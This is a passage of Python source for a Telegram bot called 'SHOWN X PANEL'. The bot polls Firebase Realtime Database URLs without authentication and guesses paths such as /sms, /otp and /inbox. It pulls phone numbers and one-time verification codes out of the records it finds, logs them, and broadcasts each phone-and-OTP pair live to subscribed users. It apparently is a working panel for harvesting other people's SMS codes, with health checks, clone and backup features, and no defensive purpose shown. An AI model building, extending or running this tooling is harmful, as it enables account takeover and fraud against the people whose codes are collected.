#  FIREBASE HEALTH
# ══════════════════════════════════════════════════════════════════
async def _ping_fb(url: str, session: aiohttp.ClientSession) -> bool:
    try:
        u = url.rstrip("/") + "/.json?shallow=true&timeout=5s"
        async with session.get(u, timeout=aiohttp.ClientTimeout(total=8)) as r:
            return r.status in (200, 404)
    except: return False

async def run_health_check(session: aiohttp.ClientSession) -> dict[str, str]:
    results: dict[str, str] = {}
    async def _check(name: str, url: str) -> None:
        alive = await _ping_fb(url, session)
        status = "alive" if alive else "dead"
        results[name] = status
        _fb_health[name] = {"status": status, "last_check": time.time(), "url": url}
        async with db() as c:
            row = c.execute("SELECT fail_count FROM firebase_health WHERE db_name=?", (name,)).fetchone()
            fc = (row["fail_count"] or 0) if row else 0
            fc = fc+1 if not alive else 0
            c.execute("INSERT INTO firebase_health(db_name,db_url,status,last_check,fail_count) "
                      "VALUES(?,?,?,?,?) ON CONFLICT(db_name) DO UPDATE SET "
                      "db_url=excluded.db_url,status=excluded.status,"
                      "last_check=excluded.last_check,fail_count=excluded.fail_count",
                      (name, url, status, datetime.utcnow().isoformat(), fc))
    await asyncio.gather(*[_check(n,u) for n,u in DATABASES.items()], return_exceptions=True)
    return results

def db_status_icon(name: str) -> str:
    s = _fb_health.get(name, {}).get("status", "unknown")
    return "🟢" if s=="alive" else "🔴" if s=="dead" else "⚪"

async def remove_dead_dbs() -> int:
    dead = [n for n,h in _fb_health.items() if h.get("status")=="dead"]
    for n in dead: DATABASES.pop(n, None)
    return len(dead)

async def validate_fb_url(url: str, session: aiohttp.ClientSession) -> bool:
    return await _ping_fb(url, session)

# ══════════════════════════════════════════════════════════════════
#  ANALYTICS
# ══════════════════════════════════════════════════════════════════
async def log_otp_analytics(db_name: str, phone: str, otp: str) -> None:
    now = datetime.utcnow()
    async with db() as c:
        c.execute("INSERT INTO otp_analytics(db_name,phone,otp,hour,day,timestamp) "
                  "VALUES(?,?,?,?,?,?)",
                  (db_name, phone, otp, now.hour, now.strftime("%Y-%m-%d"), now.isoformat()))

async def get_analytics_summary() -> dict:
    today = datetime.utcnow().strftime("%Y-%m-%d")
    async with db() as c:
        total_today = c.execute("SELECT COUNT(*) FROM otp_analytics WHERE day=?", (today,)).fetchone()[0]
        total_all   = c.execute("SELECT COUNT(*) FROM otp_analytics").fetchone()[0]
        top_db      = c.execute("SELECT db_name,COUNT(*) as cnt FROM otp_analytics WHERE day=? "
                                "GROUP BY db_name ORDER BY cnt DESC LIMIT 1", (today,)).fetchone()
        peak_hour   = c.execute("SELECT hour,COUNT(*) as cnt FROM otp_analytics WHERE day=? "
                                "GROUP BY hour ORDER BY cnt DESC LIMIT 1", (today,)).fetchone()
        week_rows   = c.execute("SELECT day,COUNT(*) as cnt FROM otp_analytics "
                                "WHERE day >= date('now','-7 days') GROUP BY day ORDER BY day").fetchall()
    return {
        "total_today": total_today, "total_all": total_all,
        "top_db": dict(top_db) if top_db else {},
        "peak_hour": dict(peak_hour) if peak_hour else {},
        "week": [dict(r) for r in week_rows],
    }

# ══════════════════════════════════════════════════════════════════
#  CLONE MANAGER
# ══════════════════════════════════════════════════════════════════
async def clone_database(src: str, new_name: str, notes: str = "") -> bool:
    url = DATABASES.get(src)
    if not url: return False
    DATABASES[new_name] = url
    async with db() as c:
        c.execute("INSERT INTO cloned_panels(name,source_name,db_url,created_at,notes) "
                  "VALUES(?,?,?,?,?)", (new_name, src, url, datetime.utcnow().isoformat(), notes))
    return True

async def get_clones() -> list[dict]:
    async with db() as c:
        rows = c.execute("SELECT * FROM cloned_panels ORDER BY created_at DESC").fetchall()
    return [dict(r) for r in rows]

# ══════════════════════════════════════════════════════════════════
#  WELCOME CONFIG
# ══════════════════════════════════════════════════════════════════
async def get_welcome() -> dict:
    async with db() as c:
        row = c.execute("SELECT * FROM welcome_config WHERE id=1").fetchone()
    return dict(row) if row else {}

async def set_welcome(text=None, media_file_id=None, media_type=None,
                      text_b=None, media_file_id_b=None, media_type_b=None) -> None:
    async with db() as c:
        c.execute("UPDATE welcome_config SET "
                  "text=COALESCE(?,text), media_file_id=COALESCE(?,media_file_id), "
                  "media_type=COALESCE(?,media_type), text_b=COALESCE(?,text_b), "
                  "media_file_id_b=COALESCE(?,media_file_id_b), "
                  "media_type_b=COALESCE(?,media_type_b), updated_at=? WHERE id=1",
                  (text, media_file_id, media_type, text_b, media_file_id_b, media_type_b,
                   datetime.utcnow().isoformat()))

async def clear_welcome_media(variant: str = "a") -> None:
    if variant == "b":
        async with db() as c:
            c.execute("UPDATE welcome_config SET media_file_id_b=NULL,media_type_b=NULL WHERE id=1")
    else:
        async with db() as c:
            c.execute("UPDATE welcome_config SET media_file_id=NULL,media_type=NULL WHERE id=1")

# ══════════════════════════════════════════════════════════════════
#  BACKUP MANAGER
# ══════════════════════════════════════════════════════════════════
def _build_snapshot() -> bytes:
    snap = {
        "version": BOT_VERSION, "timestamp": datetime.utcnow().isoformat(),
        "databases": DATABASES, "allowed_users": list(allowed_users),
        "admin_ids": list(ADMIN_IDS), "firebase_health": _fb_health,
    }
    return json.dumps(snap, ensure_ascii=False, indent=2).encode()

async def send_backup(bot, target: int) -> bool:
    try:
        data = gzip.compress(_build_snapshot())
        fname = f"shownxpanel_v18_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json.gz"
        await bot.send_document(target, io.BytesIO(data), filename=fname,
            caption=(f"🗄 <b>SHOWN X PANEL BACKUP</b>\n"
                     f"📅 {datetime.now().strftime('%d %b %Y %H:%M')}\n"
                     f"💾 {fmt_size(len(data))} · Compressed"),
            parse_mode=ParseMode.HTML)
        async with db() as c:
            c.execute("INSERT INTO backup_history(timestamp,filename,size_bytes,target_chat) "
                      "VALUES(?,?,?,?)", (datetime.utcnow().isoformat(), fname, len(data), target))
        return True
    except Exception as e:
        log.error("Backup failed: %s", e); return False

async def get_backup_history(limit: int = 10) -> list[dict]:
    async with db() as c:
        rows = c.execute("SELECT * FROM backup_history ORDER BY timestamp DESC LIMIT ?", (limit,)).fetchall()
    return [dict(r) for r in rows]

# ══════════════════════════════════════════════════════════════════
#  LIVE MONITOR
# ══════════════════════════════════════════════════════════════════
async def load_monitor_subs() -> None:
    async with db() as c:
        rows = c.execute("SELECT user_id FROM monitor_subs WHERE active=1").fetchall()
    _monitor_subs.update(r["user_id"] for r in rows)

async def toggle_monitor(uid: int) -> bool:
    async with db() as c:
        row = c.execute("SELECT active FROM monitor_subs WHERE user_id=?", (uid,)).fetchone()
        if row:
            new = 0 if row["active"] else 1
            c.execute("UPDATE monitor_subs SET active=? WHERE user_id=?", (new, uid))
        else:
            new = 1
            c.execute("INSERT INTO monitor_subs(user_id,active) VALUES(?,1)", (uid,))
    if new: _monitor_subs.add(uid)
    else: _monitor_subs.discard(uid)
    return bool(new)

async def broadcast_otp(bot, phone: str, otp: str, db_name: str, fmt: str) -> None:
    if not _monitor_subs: return
    text = (fmt.replace("{phone}", phone).replace("{otp}", otp)
               .replace("{db}", db_name).replace("{time}", datetime.now().strftime("%H:%M:%S")))
    for uid in list(_monitor_subs):
        try: await bot.send_message(uid, text, parse_mode=ParseMode.HTML)
        except (Forbidden, TelegramError): _monitor_subs.discard(uid)

# ══════════════════════════════════════════════════════════════════
#  FIREBASE DATA FETCH
# ══════════════════════════════════════════════════════════════════
_FB_PATHS = ["/sms","/SMS","/messages","/otp","/OTP","/data","/records","/inbox"]

async def fetch_firebase(url: str, session: aiohttp.ClientSession,
                         custom_path: str = "") -> list[dict]:
    paths = [custom_path] if custom_path else _FB_PATHS
    for path in paths:
        try:
            ep = url.rstrip("/") + path + "/.json"
            async with session.get(ep, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    if data and isinstance(data, dict):
                        entries = []
                        for k, v in data.items():
                            if isinstance(v, dict): entries.append({**v, "_key": k})
                            elif isinstance(v, str): entries.append({"message": v, "_key": k})
                        if entries: return entries
        except: continue
    return []

def extract_otp(entry: dict) -> tuple[str, str]:
    phone = (entry.get("phone") or entry.get("mobile") or entry.get("number") or
             entry.get("to") or entry.get("Phone") or "")
    msg   = (entry.get("message") or entry.get("body") or entry.get("text") or
             entry.get("sms") or entry.get("Message") or "")
    otp = ""
    if msg:
        m = re.search(r"\b(\d{4,8})\b", str(msg))
        if m: otp = m.group(1)
    return str(phone).strip(), str(otp).strip()

# ══════════════════════════════════════════════════════════════════
#  ACTIVITY LOG
# ══════════════════════════════════════════════════════════════════
async def log_act(uid: int, action: str, detail: str = "") -> None:
    async with db() as c:
        c.execute("INSERT INTO activity_log(user_id,action,detail,timestamp) VALUES(?,?,?,?)",
                  (uid, action, detail, datetime.utcnow().isoformat()))

# ══════════════════════════════════════════════════════════════════
#  HTTP SESSION
# ══════════════════════════════════════════════════════════════════
async def get_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=15),
        )
    return _http_session

# ══════════════════════════════════════════════════════════════════
#  KEYBOARD BUILDERS
# ══════════════════════════════════════════════════════════════════
def main_menu_kb(admin: bool = False) -> ReplyKeyboardMarkup:
    rows = [
        [_kb("📡 Panel", style="primary"),    _kb("📊 Status", style="primary")],
        [_kb("👤 My Hub", style="primary"),   _kb("❓ Help", style="primary")],
    ]
    if admin:
        rows.append([_kb("👑 Admin Panel", style="primary")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def admin_menu_kb() -> ReplyKeyboardMarkup:
    rows = [
        [_kb("🗄 DB Manager",      style="primary"), _kb("🔥 Firebase Health", style="success")],
        [_kb("📡 Live Monitor",    style="primary"), _kb("💾 Backup",           style="primary")],
        [_kb("🧬 Clone Manager",   style="primary"), _kb("🎨 Customize",        style="primary")],
        [_kb("👥 Users",           style="primary"), _kb("🚫 Ban Manager",      style="danger")],
        [_kb("📊 Analytics",       style="success"), _kb("⚙️ Settings",         style="primary")],
        [_kb("📋 Activity Log",    style="primary"), _kb("⬅️ Back",             style="primary")],
    ]
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def db_panel_kb(page: int = 0) -> InlineKeyboardMarkup:
    items = list(DATABASES.items())
    per = 8
    page_items = items[page*per:(page+1)*per]
    total_pages = max(1, (len(items)+per-1)//per)
    rows = []
    for name, _ in page_items:
        icon = db_status_icon(name)
        rows.append([_ikb(f"{icon} {name}", callback_data=f"db:view:{safe_cb(name)}", style="primary")])
    nav = []
    if page > 0:         nav.append(_ikb("⬅️", callback_data=f"db:page:{page-1}", style="primary"))
    nav.append(_ikb(f"📄 {page+1}/{total_pages}", callback_data="noop", style="primary"))
    if page < total_pages-1: nav.append(_ikb("➡️", callback_data=f"db:page:{page+1}", style="primary"))
    if nav: rows.append(nav)
    rows.append([
        _ikb("🔥 Health Check", callback_data="db:health",      style="success"),
        _ikb("🗑 Remove Dead",  callback_data="db:remove_dead", style="danger"),
    ])
    rows.append([
        _ikb("➕ Add DB",    callback_data="db:add",    style="success"),
        _ikb("📥 Import",    callback_data="db:import", style="primary"),
    ])
    rows.append(back_row("admin:home"))
    return InlineKeyboardMarkup(rows)

# ══════════════════════════════════════════════════════════════════
#  WELCOME BUILDER
# ══════════════════════════════════════════════════════════════════
async def build_welcome(user) -> tuple[str, str, str]:
    """Returns (text, media_file_id, media_type)."""
    wc = await get_welcome()
    # A/B test — random pick if B variant set
    use_b = wc.get("text_b") and random.random() < 0.5
    custom_text  = (wc.get("text_b") if use_b else wc.get("text")) or ""
    media_id     = (wc.get("media_file_id_b") if use_b else wc.get("media_file_id")) or ""
    media_type   = (wc.get("media_type_b") if use_b else wc.get("media_type")) or ""
    brand  = await get_setting("bot_brand_name", BOT_BRAND_NAME)
    owner  = await get_setting("owner_contact",  OWNER_CONTACT)
    quote  = random.choice(PANEL_QUOTES)
    mention = user.mention_html() if hasattr(user,"mention_html") else he(str(user))
    text = (
        f"<blockquote>{DIVIDER}\n"
        f"⚡ <b>{he(brand)}</b>\n"
        f"{DIVIDER}</blockquote>\n\n"
        f"👋 <b>Welcome</b> {mention}!\n\n"
        f"<blockquote>{DIVIDER_THIN}\n"
        f"💬 <i>{he(quote)}</i>\n"
        f"{DIVIDER_THIN}</blockquote>\n\n"
    )
    if custom_text:
        text += f"<blockquote>{he(custom_text)}</blockquote>\n\n"
    text += (f"<blockquote>{DIVIDER}\n"
             f"👑 <b>Owner:</b> {he(owner)}\n"
             f"🤖 <b>Version:</b> {BOT_VERSION}\n"
             f"{DIVIDER}</blockquote>")
    return text, media_id, media_type

async def migrate_from_json(path: str = "bot_database.json") -> None:
    if not Path(path).exists(): return
    try:
        with open(path) as f: data = json.load(f)
        for uid in data.get("allowed_users", []):
            try: await grant_access(int(uid))
            except: pass
        for name, url in data.get("databases", {}).items():
            if name not in DATABASES: DATABASES[name] = url
        Path(path).rename(path + ".migrated")
        log.info("Migrated %s", path)
    except Exception as e:
        log.warning("Migration failed: %s", e)

# ═══ PART 1 ENDS HERE ═══
# Merge point: Part 2 continues directly below.